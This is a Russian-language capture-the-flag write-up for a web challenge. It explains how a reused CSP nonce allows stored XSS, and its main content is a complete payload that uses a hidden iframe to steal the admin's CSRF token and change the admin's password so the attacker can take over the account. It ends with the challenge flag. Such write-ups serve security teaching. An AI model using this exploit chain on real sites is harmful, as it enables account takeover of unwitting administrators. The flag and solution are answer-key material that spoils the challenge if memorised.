# Hello, Hacr!

## Описание:


| Название | Сложность |Автор |
|------|-----|-------|
| Hello, Hacr! | Hard | [@collapsz](https://t.me/collapsz17) |

## TLDR

Кража CSRF-токена для **CSRF** через **nonce CSP bypass**

---
## Решение:

Переходим на веб-интерфейс приложения

![изображение](https://github.com/user-attachments/assets/0498ce24-bf2e-4269-bd1f-f2044f0114e5)

Можем регистрироваться и авторизовываться, создадим себе аккаунт и посмотрим, что это нам дает

![изображение](https://github.com/user-attachments/assets/bc4d30f0-d3fe-4704-bc60-9ca9300f9f9d)

Попав за авторизацию, видим, что можем писать посты и отправлять на модерацию

![изображение](https://github.com/user-attachments/assets/aa8bf140-a2c2-4a26-a3c3-59c8431b9113)

А наличие `/admin` явно дает понять нам туда. Перейдем к разведке окружения 

![изображение](https://github.com/user-attachments/assets/f103336b-2db7-41df-8546-efa26e14cc97)

Так же в приложении предусмотрен функционал смены пароля. Примечательно, что текущий пароль не требуется – нужно лишь быть авторизованным

![изображение](https://github.com/user-attachments/assets/70f6f05a-35e2-43a6-9422-d5232263bf5a)

Проверим `cookie` – установлен флаг `httponly`, значит просто украсть сессию админа не выйдет

![изображение](https://github.com/user-attachments/assets/cd3d30a7-c782-457b-bef8-409d477bead6)

Любой запрос сопровождается CSRF-токеном – это усложняет задачку реализации CSRF

![изображение](https://github.com/user-attachments/assets/8c357479-117a-46fd-bc3e-2e5b249a1914)

В заголовках видим весьма суровую CSP:

![изображение](https://github.com/user-attachments/assets/518045ea-06fb-4196-87d6-7d6646cde7f7)

Таким образом вектор атаки – обойти CSP, найти способ украсть CSRF-токен администратора, который апрувит посты направо и налево, реализовать CSRF и, сменив пароль жертве, попасть на /admin 

Приступим к способу обойти CSP. CSP Evaluator ...

![изображение](https://github.com/user-attachments/assets/dea0fe6d-f5b9-4335-a403-95791a4f0d7d)

В контексте CSP (Content Security Policy) термин nonce (от "number used once") — это криптографический токен, который используется для разрешения выполнения встроенных скриптов (<script>) или стилей (<style>), если они содержат правильный атрибут nonce. Это механизм защиты от XSS-атак (межсайтового скриптинга), позволяющий контролировать, какие скрипты могут выполняться на странице.

Можем попробовать вызвать алерт с использованием nonce:

```
<script nonce="matrixrain">alert(1)</script>
```

Отлично – CSP обошли. Далее CSRF. Как мы помним, приложение использует CSRF токены для всех действий, значит сменить пароль, не зная этот токен, не выйдет. Однако у нас есть способ вызвать XSS, а значит мы можем внедрить вредоносный код, который сделает все за нас. 

Первым делом создадим `iframe` и укажем его источник, чтобы сделать возможной кражу CSRF-токена:
```
var iframe = document.createElement("iframe");
iframe.src = "/change_password";
iframe.style.display = "none";
document.body.appendChild(iframe);
```
Далее объявим основную функцию эксплоита и извлечем CSRF-токен со страницы /change_password: 
```
iframe.onload = function() {
var csrfToken = iframe.contentDocument.querySelector('input[name="csrf_token"]').value;
```
Укажем наш пароль: 
```
var newPassword = "zxczxczxc";
```
И, наконец, отправим запрос с использованием `XMLHttpRequest`:
```
var xhr = new XMLHttpRequest();
xhr.open("POST", "/change_password", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("csrf_token=" + csrfToken + "&new_password=" + newPassword);
```
Соберем сплоит воедино:
```
<script nonce="matrixrain">
var iframe = document.createElement("iframe");
iframe.src = "/change_password";
iframe.style.display = "none";
document.body.appendChild(iframe);

iframe.onload = function() {
    var csrfToken = iframe.contentDocument.querySelector('input[name="csrf_token"]').value;
    var newPassword = "zxczxczxc";

    var xhr = new XMLHttpRequest();
    xhr.open("POST", "/change_password", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.send("csrf_token=" + csrfToken + "&new_password=" + newPassword);
};
</script>
```
Напишем пост и отправим его на модерацию. 

Остается лишь дождаться модерации от администратора, зайти под ним и забрать флаг!


## Flag:
rdg{af4cf13151aee7af4aa26b9bb817a079}
